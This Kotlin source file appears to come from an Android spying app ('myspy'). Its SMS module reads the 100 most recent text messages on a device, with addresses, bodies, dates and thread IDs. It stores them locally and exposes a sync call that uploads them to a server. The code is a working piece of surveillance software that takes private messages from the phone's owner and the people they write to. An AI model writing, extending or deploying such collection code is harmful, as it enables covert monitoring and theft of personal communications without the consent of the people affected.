package com.myspy.android.modules.sms

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.provider.Telephony
import androidx.core.content.ContextCompat
import com.myspy.android.data.local.db.entities.SmsEntity
import com.myspy.android.data.repository.SmsRepository
import kotlinx.coroutines.*

/**
 * SMS Module
 * @author Michael KOJDL
 * @version 1.0.0
 */
class SmsModule(
    private val context: Context,
    private val repository: SmsRepository
) {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var isRunning = false

    fun start() {
        if (!hasPermissions()) {
            return
        }

        isRunning = true

        // Collect existing SMS
        collectExistingSms()
    }

    fun stop() {
        isRunning = false
        scope.coroutineContext.cancelChildren()
    }

    private fun hasPermissions(): Boolean {
        return ContextCompat.checkSelfPermission(
            context,
            Manifest.permission.READ_SMS
        ) == PackageManager.PERMISSION_GRANTED
    }

    private fun collectExistingSms() {
        scope.launch {
            try {
                val cursor = context.contentResolver.query(
                    Telephony.Sms.CONTENT_URI,
                    arrayOf(
                        Telephony.Sms._ID,
                        Telephony.Sms.TYPE,
                        Telephony.Sms.ADDRESS,
                        Telephony.Sms.BODY,
                        Telephony.Sms.DATE,
                        Telephony.Sms.THREAD_ID
                    ),
                    null,
                    null,
                    "${Telephony.Sms.DATE} DESC LIMIT 100"
                )

                cursor?.use {
                    val smsList = mutableListOf<SmsEntity>()

                    while (it.moveToNext()) {
                        val type = when (it.getInt(it.getColumnIndexOrThrow(Telephony.Sms.TYPE))) {
                            Telephony.Sms.MESSAGE_TYPE_INBOX -> "INCOMING"
                            Telephony.Sms.MESSAGE_TYPE_SENT -> "OUTGOING"
                            Telephony.Sms.MESSAGE_TYPE_DRAFT -> "DRAFT"
                            else -> "INCOMING"
                        }

                        val sms = SmsEntity(
                            type = type,
                            address = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)) ?: "",
                            body = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.BODY)) ?: "",
                            timestamp = it.getLong(it.getColumnIndexOrThrow(Telephony.Sms.DATE)),
                            threadId = it.getInt(it.getColumnIndexOrThrow(Telephony.Sms.THREAD_ID))
                        )
                        smsList.add(sms)
                    }

                    if (smsList.isNotEmpty()) {
                        repository.saveMultiple(smsList)
                    }
                }
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }

    suspend fun syncData(): Result<Int> {
        return repository.syncToServer()
    }

    fun getUnsyncedCount(): Int {
        return runBlocking {
            repository.getUnsyncedCount()
        }
    }
}
